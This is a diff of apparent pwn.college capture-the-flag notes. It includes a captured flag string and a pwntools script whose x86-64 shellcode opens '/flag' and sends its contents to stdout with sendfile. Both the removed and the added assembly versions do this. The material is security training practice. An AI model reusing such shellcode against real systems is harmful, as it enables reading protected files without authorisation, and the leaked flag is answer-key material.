@@ -232,6 +232,8 @@ flag=pwn.college{gDBurPf4kUtqmbvJjYddeAa2cDA.QX4EjMsADOzQzW}
 
                
                level 3
+               
+//not the solution
 from pwn import *
 
 # set some context
@@ -242,23 +244,25 @@ warnings.simplefilter("ignore")
 
 # assembly goes here, most of the rest is boilerplate
 assembly = """
-
-   mov rbx, 0x00000067616c662f
-   push rbx
-   mov rax, 2
-   mov rdi, rsp
-   mov rsi, 0
-   syscall
-
-   mov rdi, 1
-   mov rsi, rax
-   mov rdx, 0
-   mov r10, 1000
-   mov rax, 40 
-   syscall 
-   
-   mov rax, 60
-   syscall
+    movabs  rbx, 0x67616c662f
+    push    rbx
+        
+    mov     rdx, 0x400
+    mov     rsi, 0x0
+    mov     rdi, rsp
+    mov     rax, 0x2
+    syscall    
+    
+    mov     r10, 0x3e8
+    mov     rdx, 0x0
+    mov     rsi, rax
+    mov     rdi, 0x1
+    mov     rax, 0x28
+    syscall
+    
+    mov     rdi, 0x0
+    mov     rax, 0x3c
+    syscall
 """
 
 # the hostname will always be the same as challenge binary
